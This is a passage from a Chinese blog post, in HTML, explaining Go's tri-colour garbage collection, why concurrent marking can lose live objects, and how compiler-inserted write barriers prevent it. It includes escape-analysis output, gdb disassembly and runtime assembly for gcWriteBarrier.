也就是回收垃圾，如图所示。</p><p>以上我们将全部的白色对象进行删除回收，<img src="https://cdn.nlark.com/yuque/0/2022/jpeg/26269664/1651035960263-e50436a6-4a3c-48f9-82cb-bb5729d71116.jpeg?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_55,text_5YiY5Li55YawQWNlbGQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img">剩下的就是全部依赖的黑色对象。</p><p>三色标记清除算法本身是不可以并发或者增量执行的，<strong>它需要STW</strong>，<strong>而如果并发执行，用户程序可能在标记执行的过程中修改对象的指针。</strong></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/VY8SELNGe94Cjxng5VbT4M7FkUgyAfhpDGBI8liaibcvyXxOjP7kowzG1TnVmgAJefhegPo2IJiabXQ6IxnRdVqPQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h3 id="没有STW的异常情况一般会有2种："><a href="#没有STW的异常情况一般会有2种：" class="headerlink" title="没有STW的异常情况一般会有2种："></a><strong>没有STW的异常情况一般会有2种：</strong></h3><p>1.一种是把原本应该垃圾回收的死亡对象错误的标记为存活。虽然这不好，但是不会导致严重后果，只不过产生了一点逃过本次回收的浮动垃圾而已，下次清理就可以，比如上图所示的三色标记过程中，用户程序取消了从B对象到E对象的引用，但是因为B到E已经被标记完成不会继续执行步骤2，所以E对象最终会被错误的标记成黑色，不会被回收，这个E就是<strong>浮动垃圾</strong>，会在下次垃圾收集中清理。</p><p>2.一种是把原本存活的对象错误的标记为已死亡，导致“对象消失”，这在内存管理中是非常严重的错误。比如上图所示的三色标记过程中，用户程序建立了从B对象到H对象的引用(例如<strong>B.next &#x3D;H</strong>)，接着执行<strong>D.next&#x3D;nil</strong>，但是因为B到H中不存在灰色对象，因此在这之间不会继续执行三色并发标记中的步骤2，D到H之间的链接被断开，所以H对象最终会被标记成白色，会被垃圾收集器错误地回收。我们将这种错误称为<strong>悬挂指针</strong>，即指针没有指向特定类型的合法对象，影响了内存的安全性。</p><h3 id="没有STW的三色标记法情况下-—-悬挂指针的具体介绍"><a href="#没有STW的三色标记法情况下-—-悬挂指针的具体介绍" class="headerlink" title="没有STW的三色标记法情况下  — 悬挂指针的具体介绍"></a>没有STW的三色标记法情况下  — 悬挂指针的具体介绍</h3><p>先抛砖引玉，我们加入如果没有STW，那么也就不会再存在性能上的问题，那么接下来我们假设如果三色标记法不加入STW会发生什么事情？<br>我们还是基于上述的三色并发标记法来说, 他是一定要依赖STW的. 因为如果不暂停程序, 程序的逻辑改变对象引用关系, 这种动作如果在标记阶段做了修改，会影响标记结果的正确性，我们来看看一个场景，如果三色标记法, 标记过程不使用STW将会发生什么事情?</p><p>1.我们把初始状态设置为已经经历了第一轮扫描，目前黑色的有对象1和对象4， 灰色的有对象2和对象7，其他的为白色对象，且对象2是通过指针p指向对象3的，如图所示。<br><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/no_STW_1.png" alt="no_STW_1"></p><p>2.现在如何三色标记过程不启动STW，那么在GC扫描过程中，任意的对象均可能发生读写操作，如图所示，在还没有扫描到对象2的时候，已经标记为黑色的对象4，此时创建指针q，并且指向白色的对象3。</p><p><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/no_STW_2.png" alt="no_STW_2"></p><ol start="3"><li>与此同时灰色的对象2将指针p移除，那么白色的对象3实则就是被挂在了已经扫描完成的黑色的对象4下，如图所示。</li></ol><p><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/no_STW_3.png" alt="no_STW_3"></p><p>4.然后我们正常指向三色标记的算法逻辑，将所有灰色的对象标记为黑色，那么对象2和对象7就被标记成了黑色，如图所示。<img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/no_STW_4.png" alt="no_STW_4"></p><p>5.那么就执行了三色标记的最后一步，将所有白色对象当做垃圾进行回收，如图所示。</p><p><img src="https://liangyaopei.github.io/2021/01/02/golang-gc-intro/no_STW_5.png" alt="no_STW_5"><br>但是最后我们才发现，本来是对象4合法引用的对象3，却被GC给“误杀”回收掉了。</p><p><strong>可以看出，有两种情况，在三色标记法中，是不希望被发生的。</strong></p><ul><li>条件1: 一个白色对象被黑色对象引用**(白色被挂在黑色下)**</li><li>条件2: 灰色对象与它之间的可达关系的白色对象遭到破坏**(灰色同时丢了该白色)**<br>如果当以上两个条件同时满足时，就会出现对象丢失现象!</li></ul><p>并且，如图所示的场景中，如果示例中的白色对象3还有很多下游对象的话, 也会一并都清理掉。</p><p>为了防止这种现象的发生，最简单的方式就是STW，直接禁止掉其他用户程序对对象引用关系的干扰，但是<strong>STW的过程有明显的资源浪费，对所有的用户程序都有很大影响</strong>。那么是否可以在保证对象不丢失的情况下合理的尽可能的提高GC效率，减少STW时间呢？答案是可以的，我们只要使用一种机制，尝试去破坏上面的两个必要条件就可以了。</p><h2 id="四、屏障技术"><a href="#四、屏障技术" class="headerlink" title="四、屏障技术"></a><strong>四、屏障技术</strong></h2><p>为了解决上述的“对象消失”的现象，Wilson于1994年在理论上证明了，当且仅当以下两个条件同时满足时，会产生“对象消失”的问题，即原本应该是黑色的对象被误标为白色：</p><ul><li>赋值器插入了一条或多条从黑色对象到白色对象的新引用；</li><li>赋值器删除了全部从灰色对象到该白色对象的直接或间接引用。</li></ul><p>因此为了我们要解决并发扫描时的对象消失问题，保证垃圾收集算法的正确性，只需破坏这两个条件的任意一个即可，<strong>屏障技术</strong>就是在并发或者增量标记过程中保证<strong>三色不变性</strong>的重要技术。</p><p>内存屏障技术是一种屏障指令，它可以让CPU或者编译器在执行内存相关操作时遵循特定的约束，目前多数的现代处理器都会乱序执行指令以最大化性能，但是该技术能够保证内存操作的顺序性，在内存屏障前执行的操作一定会先于内存屏障后执行的操作。垃圾收集中的屏障技术更像是一个<strong>钩子方法</strong>，它是在用户程序读取对象、创建新对象以及更新对象指针时执行的一段代码，根据操作类型的不同，我们可以将它们分成<strong>读屏障（Read barrier）</strong>和写屏障（Write barrier）两种，<strong>因为读屏障需要在读操作中加入代码片段，对用户程序的性能影响很大，所以编程语言往往都会采用写屏障保证三色不变性。</strong></p><p><strong>重点</strong>：</p><ol><li><strong>写屏障的代码在编译期间生成好，之后不会再变化；</strong></li><li>堆上对象赋值才会生成写屏障；</li><li>哪些对象分配在栈上，哪些分配在堆上？也是编译期间由编译器决定，这个过程叫做“逃逸分析”；</li></ol><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>下面的例子使用的是 go1.13.3。</p><h5 id="示例分析代码"><a href="#示例分析代码" class="headerlink" title="示例分析代码"></a>示例分析代码</h5><p>写屏障是编译器生成的，先形象看下代码样子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"> <span class="hljs-number">1</span> <span class="hljs-keyword">package</span> main<br> <span class="hljs-number">2</span> <br> <span class="hljs-number">3</span> <span class="hljs-keyword">type</span> BaseStruct <span class="hljs-keyword">struct</span> &#123;<br> <span class="hljs-number">4</span>     name <span class="hljs-type">string</span><br> <span class="hljs-number">5</span>     age  <span class="hljs-type">int</span><br> <span class="hljs-number">6</span> &#125;<br> <span class="hljs-number">7</span> <br> <span class="hljs-number">8</span> <span class="hljs-keyword">type</span> Tstruct <span class="hljs-keyword">struct</span> &#123;<br> <span class="hljs-number">9</span>     base   *BaseStruct<br><span class="hljs-number">10</span>     field0 <span class="hljs-type">int</span><br><span class="hljs-number">11</span> &#125;<br><span class="hljs-number">12</span> <br><span class="hljs-number">13</span> <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcAlloc0</span> <span class="hljs-params">(a *Tstruct)</span></span> &#123;<br><span class="hljs-number">14</span>     a.base = <span class="hljs-built_in">new</span>(BaseStruct)    <span class="hljs-comment">// new 一个BaseStruct结构体，赋值给 a.base 字段</span><br><span class="hljs-number">15</span> &#125;<br><span class="hljs-number">16</span> <br><span class="hljs-number">17</span> <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">funcAlloc1</span> <span class="hljs-params">(b *Tstruct)</span></span> &#123;<br><span class="hljs-number">18</span>     <span class="hljs-keyword">var</span> b0 Tstruct<br><span class="hljs-number">19</span>     b0.base = <span class="hljs-built_in">new</span>(BaseStruct)  <span class="hljs-comment">// new 一个BaseStruct结构体，赋值给 b0.base 字段</span><br><span class="hljs-number">20</span> &#125;<br><span class="hljs-number">21</span> <br><span class="hljs-number">22</span> <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-number">23</span>     a := <span class="hljs-built_in">new</span>(Tstruct)    <span class="hljs-comment">// new 一个Tstruct 结构体</span><br><span class="hljs-number">24</span>     b := <span class="hljs-built_in">new</span>(Tstruct)   <span class="hljs-comment">// new 一个Tstruct 结构体</span><br><span class="hljs-number">25</span>     <br><span class="hljs-number">26</span>     <span class="hljs-keyword">go</span> funcAlloc0(a)<br><span class="hljs-number">27</span>     <span class="hljs-keyword">go</span> funcAlloc1(b)<br><span class="hljs-number">28</span> &#125;<br></code></pre></td></tr></table></figure><p>这里例子，可以用来观察两个东西：</p><ol><li>逃逸分析</li><li>编译器插入内存屏障的时机</li></ol><h5 id="逃逸分析"><a href="#逃逸分析" class="headerlink" title="逃逸分析"></a>逃逸分析</h5><p>只有堆上对象的写才会可能有写屏障，因为如果对栈上的写做拦截，那么流程代码会非常复杂，并且性能下降会非常大，得不偿失。根据局部性的原理来说，其实我们程序跑起来，大部分的其实都是操作在栈上，函数参数啊、函数调用导致的压栈出栈啊、局部变量啊，协程栈，这些如果也弄起写屏障，那么可想而知了，根本就不现实，复杂度和性能就是越不过去的坎。</p><p>继续看逃逸什么意思？就是内存分配到堆上。golang 可以在编译的时候使用 <code>-m</code> 参数支持把这个可视化出来：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">go</span> build -gcflags <span class="hljs-string">&quot;-N -l -m&quot;</span> ./test_writebarrier0.<span class="hljs-keyword">go</span> <br># <span class="hljs-keyword">command</span>-<span class="hljs-built_in">line</span>-arguments<br>./test_writebarrier0.<span class="hljs-keyword">go</span>:<span class="hljs-number">13</span>:<span class="hljs-number">18</span>: funcAlloc0 <span class="hljs-keyword">a</span> does not <span class="hljs-built_in">escape</span><br>./test_writebarrier0.<span class="hljs-keyword">go</span>:<span class="hljs-number">14</span>:<span class="hljs-number">17</span>: <span class="hljs-keyword">new</span>(BaseStruct) escapes <span class="hljs-keyword">to</span> heap<br>./test_writebarrier0.<span class="hljs-keyword">go</span>:<span class="hljs-number">17</span>:<span class="hljs-number">18</span>: funcAlloc1 <span class="hljs-keyword">b</span> does not <span class="hljs-built_in">escape</span><br>./test_writebarrier0.<span class="hljs-keyword">go</span>:<span class="hljs-number">19</span>:<span class="hljs-number">18</span>: funcAlloc1 <span class="hljs-keyword">new</span>(BaseStruct) does not <span class="hljs-built_in">escape</span><br>./test_writebarrier0.<span class="hljs-keyword">go</span>:<span class="hljs-number">23</span>:<span class="hljs-number">13</span>: <span class="hljs-keyword">new</span>(Tstruct) escapes <span class="hljs-keyword">to</span> heap<br>./test_writebarrier0.<span class="hljs-keyword">go</span>:<span class="hljs-number">24</span>:<span class="hljs-number">13</span>: <span class="hljs-keyword">new</span>(Tstruct) escapes <span class="hljs-keyword">to</span> heap<br></code></pre></td></tr></table></figure><p><strong>先说逃逸分析两点原则</strong>：</p><ol><li>在保证程序正确性的前提下，尽可能的把对象分配到栈上，这样性能最好；<ol><li>栈上的对象生命周期就跟随 goroutine ，协程终结了，它就没了</li></ol></li><li>明确一定要分配到堆上对象，或者不确定是否要分配在堆上的对象，那么就全都分配到堆上；<ol><li>这种对象的生命周期始于业务程序的创建，终于垃圾回收器的回收</li></ol></li></ol><p>我们看到源代码，有四次 new 对象的操作，经过编译器的“逃逸分析”之后，实际分配到堆上的是三次：</p><ol><li><p>14 行 —— 触发逃逸（分配到堆上）</p><ol><li>这个必须得分配到堆上，因为除了这个 goroutine 还要存活呢</li></ol></li><li><p>19 行 —— 无 （分配到栈上）</p><ol><li>这个虽然也是 new，单就分配到栈上就行，因为 b0 这个对象就是一个纯粹的栈对象</li></ol></li><li><p>23 行 —— 触发逃逸 （分配到堆上）</p><ol><li>这个需要分配到堆上，因为分配出来的对象需要传递到其他协程使用</li></ol></li><li><p>24 行 —— 触发逃逸 （分配到堆上）</p><p>1.这次必须注意下，其实站在我们上帝视角，这次的分配其实也可以分配到栈上。这种情况编译器就简单处理了，直接给分配到堆上。这种就属于编译器它摸不准的，那么分配到堆上就对了，反正也就性能有点影响，功能不会有问题，不然的话你真分配到栈上了，一旦栈被回收就出问题了</p></li></ol><h5 id="写屏障真实的样子"><a href="#写屏障真实的样子" class="headerlink" title="写屏障真实的样子"></a>写屏障真实的样子</h5><p>再看下编译器汇编的代码：</p><p><img src="https://cdn.jsdelivr.net/gh/liqingqiya/liqingqiya.github.io/images/posts/2020-07-11-gc2/8F95309B-9CD8-44E2-A65A-BAAA96CC0BE8.png"></p><p>从这个地方我们需要知道一个事情，go 的关键字语法呀，其实在编译的时候，都会对应到一个特定的函数，比如 new 这个关键字就对应了 <code>newobject</code> 函数，go 这个关键字对应的是 <code>newproc</code> 函数。贴一张比较完整的图：</p><p><img src="https://cdn.jsdelivr.net/gh/liqingqiya/liqingqiya.github.io/images/posts/2020-07-11-gc2/Image.png"></p><p>从这个汇编代码我们也确认了，23，24行的对象分配确实是在堆上。我们再看下函数 <code>funcAlloc0</code> 和 <code>funcAlloc1</code> 这两个。</p><p><strong><code>main.funcAlloc0</code></strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">13 </span>func funcAlloc0 (a *Tstruct) &#123;<br><span class="hljs-symbol">14 </span>    a.<span class="hljs-keyword">base</span> = <span class="hljs-keyword">new</span>(BaseStruct)    // <span class="hljs-keyword">new</span> 一个BaseStruct结构体，赋值给 a.<span class="hljs-keyword">base</span> 字段<br><span class="hljs-symbol">15 </span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/liqingqiya/liqingqiya.github.io/images/posts/2020-07-11-gc2/23DEE999-886F-4298-BCAE-EDB4F7A0B454.png"></p><p>简单的注释解析：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">(gdb) disassemble <br>Dump of assembler code for function main<span class="hljs-number">.</span>funcAlloc0:<br>   <span class="hljs-number">0x0000000000456b10</span> &lt;+<span class="hljs-number">0</span>&gt;:     <span class="hljs-keyword">mov</span>    %fs:<span class="hljs-number">0xfffffffffffffff8</span>,%rcx<br>   <span class="hljs-number">0x0000000000456b19</span> &lt;+<span class="hljs-number">9</span>&gt;:     <span class="hljs-keyword">cmp</span>    <span class="hljs-number">0x10</span>(%rcx),%rsp<br>   <span class="hljs-number">0x0000000000456b1d</span> &lt;+<span class="hljs-number">13</span>&gt;:    <span class="hljs-keyword">jbe</span>    <span class="hljs-number">0x456b6f</span> &lt;main<span class="hljs-number">.</span>funcAlloc0+<span class="hljs-number">95</span>&gt;<br>   <span class="hljs-number">0x0000000000456b1f</span> &lt;+<span class="hljs-number">15</span>&gt;:    <span class="hljs-keyword">sub</span>    <span class="hljs-number">$0</span>x20,%rsp<br>   <span class="hljs-number">0x0000000000456b23</span> &lt;+<span class="hljs-number">19</span>&gt;:    <span class="hljs-keyword">mov</span>    %rbp,<span class="hljs-number">0x18</span>(%rsp)<br>   <span class="hljs-number">0x0000000000456b28</span> &lt;+<span class="hljs-number">24</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-number">0x18</span>(%rsp),%rbp<br>   <span class="hljs-number">0x0000000000456b2d</span> &lt;+<span class="hljs-number">29</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-number">0x1430c</span>(%rip),%rax        # <span class="hljs-number">0x46ae40</span><br>   <span class="hljs-number">0x0000000000456b34</span> &lt;+<span class="hljs-number">36</span>&gt;:    <span class="hljs-keyword">mov</span>    %rax,(%rsp)<br>   <span class="hljs-number">0x0000000000456b38</span> &lt;+<span class="hljs-number">40</span>&gt;:    callq  <span class="hljs-number">0x40b060</span> &lt;runtime<span class="hljs-number">.</span>newobject&gt;<br>   # newobject的返回值在 <span class="hljs-number">0x8</span>(%rsp) 里，golang 的参数和返回值都是通过栈传递的。这个跟 c 程序不同，c 程序是溢出才会用到栈，这里先把返回值放到寄存器 <span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x0000000000456b3d</span> &lt;+<span class="hljs-number">45</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">0x8</span>(%rsp),%rax           <br>   <span class="hljs-number">0x0000000000456b42</span> &lt;+<span class="hljs-number">50</span>&gt;:    <span class="hljs-keyword">mov</span>    %rax,<span class="hljs-number">0x10</span>(%rsp)<br>   # <span class="hljs-number">0x28</span>(%rsp) 就是 a 的地址：<span class="hljs-number">0xc0000840b0</span><br>=&gt; <span class="hljs-number">0x0000000000456b47</span> &lt;+<span class="hljs-number">55</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">0x28</span>(%rsp),%rdi         <br>   <span class="hljs-number">0x0000000000456b4c</span> &lt;+<span class="hljs-number">60</span>&gt;:    <span class="hljs-keyword">test</span>   %al,(%rdi)<br>   # 这里判断是否开启了屏障（垃圾回收的扫描并发过程，才会把这个标记打开，没有打开的情况，对于堆上的赋值只是多走一次判断开销）<br>   <span class="hljs-number">0x0000000000456b4e</span> &lt;+<span class="hljs-number">62</span>&gt;:    cmpl   <span class="hljs-number">$0</span>x0,<span class="hljs-number">0x960fb</span>(%rip)        # <span class="hljs-number">0x4ecc50</span> &lt;runtime<span class="hljs-number">.</span>writeBarrier&gt;<br>   <span class="hljs-number">0x0000000000456b55</span> &lt;+<span class="hljs-number">69</span>&gt;:    <span class="hljs-keyword">je</span>     <span class="hljs-number">0x456b59</span> &lt;main<span class="hljs-number">.</span>funcAlloc0+<span class="hljs-number">73</span>&gt;<br>   <span class="hljs-number">0x0000000000456b57</span> &lt;+<span class="hljs-number">71</span>&gt;:    <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x456b68</span> &lt;main<span class="hljs-number">.</span>funcAlloc0+<span class="hljs-number">88</span>&gt;<br>   # 赋值 a<span class="hljs-number">.</span>base = xxxx<br>   <span class="hljs-number">0x0000000000456b59</span> &lt;+<span class="hljs-number">73</span>&gt;:    <span class="hljs-keyword">mov</span>    %rax,(%rdi)<br>   <span class="hljs-number">0x0000000000456b5c</span> &lt;+<span class="hljs-number">76</span>&gt;:    <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x456b5e</span> &lt;main<span class="hljs-number">.</span>funcAlloc0+<span class="hljs-number">78</span>&gt;<br>   <span class="hljs-number">0x0000000000456b5e</span> &lt;+<span class="hljs-number">78</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">0x18</span>(%rsp),%rbp<br>   <span class="hljs-number">0x0000000000456b63</span> &lt;+<span class="hljs-number">83</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x20,%rsp<br>   <span class="hljs-number">0x0000000000456b67</span> &lt;+<span class="hljs-number">87</span>&gt;:    retq   <br>   # 如果是开启了屏障，那么完成 a<span class="hljs-number">.</span>base = xxx 的赋值就是在 gcWriteBarrier 函数里面了<br>   <span class="hljs-number">0x0000000000456b68</span> &lt;+<span class="hljs-number">88</span>&gt;:    callq  <span class="hljs-number">0x44d170</span> &lt;runtime<span class="hljs-number">.</span>gcWriteBarrier&gt;<br>   <span class="hljs-number">0x0000000000456b6d</span> &lt;+<span class="hljs-number">93</span>&gt;:    <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x456b5e</span> &lt;main<span class="hljs-number">.</span>funcAlloc0+<span class="hljs-number">78</span>&gt;<br>   <span class="hljs-number">0x0000000000456b6f</span> &lt;+<span class="hljs-number">95</span>&gt;:    callq  <span class="hljs-number">0x44b370</span> &lt;runtime<span class="hljs-number">.</span>morestack_noctxt&gt;<br>   <span class="hljs-number">0x0000000000456b74</span> &lt;+<span class="hljs-number">100</span>&gt;:   <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x456b10</span> &lt;main<span class="hljs-number">.</span>funcAlloc0&gt;<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p><strong>所以，从上面简单的汇编代码，我们印证得出几个小知识点</strong>：</p><ol><li>golang 传参和返回参数都是通过栈来传递的（可以思考下优略点，有点是逻辑简单了，也能很好的支持多返回值的实现，缺点是比寄存器的方式略慢，但是这种损耗在程序的运行下可以忽略）；</li><li>写屏障是一段编译器插入的特殊代码，在编译期间插入，代码函数名字叫做 <code>gcWriteBarrier</code> ；</li><li>屏障代码并不是直接运行，也是要条件判断的，并不是只要是堆上内存赋值就会运行gcWriteBarrier 代码，而是要有一个条件判断。这里透露下，这个条件判断是垃圾回收器扫描开始前，stw 程序给设置上去的；<ol><li>所以平时对于堆上内存的赋值，多了一次写操作；</li></ol></li></ol><p>伪代码如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span> runtime.writeBarrier.enabled &#123;<br>    runtime.gc<span class="hljs-constructor">WriteBarrier(<span class="hljs-params">ptr</span>, <span class="hljs-params">val</span>)</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    *ptr = <span class="hljs-keyword">val</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>runtime·gcWriteBarrier</code> 函数干啥的，这个函数是用纯汇编写的，举一个特定cpu集合的例子，在 asm_amd64.s 里的实现。这个函数只干两件事：</p><ol><li>执行写请求</li><li>处理 GC 相关的逻辑</li></ol><p>下面简单理解下 <code>runtime·gcWriteBarrier</code> 这个函数：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">TEXT runtime·gcWriteBarrier(SB),<span class="hljs-built_in">NOSPLIT</span>,<span class="hljs-number">$120</span><br><br>        get_tls(<span class="hljs-built_in">R13</span>)<br>        <span class="hljs-keyword">MOVQ</span>    g(<span class="hljs-built_in">R13</span>), <span class="hljs-built_in">R13</span><br>        <span class="hljs-keyword">MOVQ</span>    g_m(<span class="hljs-built_in">R13</span>), <span class="hljs-built_in">R13</span><br>        <span class="hljs-keyword">MOVQ</span>    m_p(<span class="hljs-built_in">R13</span>), <span class="hljs-built_in">R13</span><br>        <span class="hljs-keyword">MOVQ</span>    (p_wbBuf+wbBuf_next)(<span class="hljs-built_in">R13</span>), <span class="hljs-built_in">R14</span><br><br>        LEAQ    <span class="hljs-number">16</span>(<span class="hljs-built_in">R14</span>), <span class="hljs-built_in">R14</span><br>        <span class="hljs-keyword">MOVQ</span>    <span class="hljs-built_in">R14</span>, (p_wbBuf+wbBuf_next)(<span class="hljs-built_in">R13</span>)<br>    // 检查 buffer 队列是否满？<br>        CMPQ    <span class="hljs-built_in">R14</span>, (p_wbBuf+wbBuf_end)(<span class="hljs-built_in">R13</span>)<br><br>    // 赋值的前后两个值都会被入队<br><br>        // 把 value 存到指定 buffer 位置<br>        <span class="hljs-keyword">MOVQ</span>    <span class="hljs-built_in">AX</span>, -<span class="hljs-number">16</span>(<span class="hljs-built_in">R14</span>)   // Record value<br><br>    // 把 *slot 存到指定 buffer 位置<br>        <span class="hljs-keyword">MOVQ</span>    (<span class="hljs-built_in">DI</span>), <span class="hljs-built_in">R13</span><br>        <span class="hljs-keyword">MOVQ</span>    <span class="hljs-built_in">R13</span>, -<span class="hljs-number">8</span>(<span class="hljs-built_in">R14</span>)<br><br>    // 如果 wbBuffer 队列满了，那么就下刷处理，比如置灰，置黑等操作<br>        JEQ     flush<br><span class="hljs-symbol">ret:</span><br>    // 赋值：*slot = val <br>        <span class="hljs-keyword">MOVQ</span>    <span class="hljs-number">104</span>(<span class="hljs-built_in">SP</span>), <span class="hljs-built_in">R14</span><br>        <span class="hljs-keyword">MOVQ</span>    <span class="hljs-number">112</span>(<span class="hljs-built_in">SP</span>), <span class="hljs-built_in">R13</span><br>        <span class="hljs-keyword">MOVQ</span>    <span class="hljs-built_in">AX</span>, (<span class="hljs-built_in">DI</span>)<br>        <span class="hljs-keyword">RET</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">flush:</span><br>    。。。<br><br>        //  队列满了，统一处理，这个其实是一个批量优化手段<br>        <span class="hljs-keyword">CALL</span>    runtime·wbBufFlush(SB)<br><br>    。。。<br><br>        <span class="hljs-keyword">JMP</span>     <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p><strong>思考下：不是说把 <code>\*slot = value</code> 直接置灰色，置黑色，就完了嘛，这里搞得这么复杂？</strong></p><p>最开始还真不是这样的，这个也是一个优化的过程，这里是利用批量的一个思想做的一个优化。我们再理解下最本质的东西，触发了写屏障之后，我们的核心目的是为了能够把赋值的前后两个值记录下来，以便 GC 垃圾回收器能得到通知，从而避免错误的回收。记录下来是最本质的，但是并不是要立马处理，所以这里做的优化就是，攒满一个 buffer ，然后批量处理，这样效率会非常高的。</p><p>wbBuf 结构如下： |————————————-| | 8 | 8 | 8 * 512 | 4 | |————————————-|</p><p>每个 P 都有这么个 wbBuf 队列。</p><p>我们看到 <code>CALL runtime·wbBufFlush(SB)</code> ，这个函数 wbBufFlush 是 golang 实现的，本质上是调用 <code>wbBufFlush1</code> 。这个函数才是 hook 写操作想要做的事情，精简了下代码如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs stylus">func <span class="hljs-built_in">wbBufFlush1</span>(_p_ *p) &#123;<br>        start := <span class="hljs-built_in">uintptr</span>(unsafe<span class="hljs-selector-class">.Pointer</span>(&amp;_p_<span class="hljs-selector-class">.wbBuf</span><span class="hljs-selector-class">.buf</span><span class="hljs-selector-attr">[0]</span>))<br>        n := (_p_<span class="hljs-selector-class">.wbBuf</span><span class="hljs-selector-class">.next</span> - start) / unsafe<span class="hljs-selector-class">.Sizeof</span>(_p_<span class="hljs-selector-class">.wbBuf</span><span class="hljs-selector-class">.buf</span><span class="hljs-selector-attr">[0]</span>)<br>        ptrs := 